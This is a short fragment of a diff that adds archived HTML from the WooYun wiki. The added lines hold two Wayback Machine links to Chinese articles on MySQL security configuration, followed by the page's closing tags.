+<a href="https://web.archive.org/web/20160307185128/http://drops.wooyun.org/tips/2245" title="http://drops.wooyun.org/tips/2245" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Mysql安全配置</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307185128/http://www.ha97.com/4092.html" title="http://www.ha97.com/4092.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">MySQL安全配置详解</a>
+</p>
+
+</div>
+
+              
+
+                            
+            <span style="display:table;clear:both;"/></div></div></div></span></div></div></div></div></div><br/></div></body></html>
